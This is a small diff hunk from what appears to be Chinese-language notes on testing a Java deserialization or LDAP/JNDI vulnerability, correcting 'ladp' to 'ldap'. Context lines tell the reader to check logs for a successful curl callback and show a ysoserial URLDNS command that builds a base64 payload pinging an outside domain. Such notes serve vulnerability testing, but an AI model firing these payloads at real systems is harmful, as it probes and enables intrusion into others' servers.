@@ -19,7 +19,7 @@ User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X)
 3. 查看日志是否curl成功
 
 
-ladp:
+ldap:
 1. 用下面命令生成base64编码过的测试语句
 java -jar ysoserial6.jar URLDNS 'http://wyzxxz.cn'|base64 > base64_payload_file
 
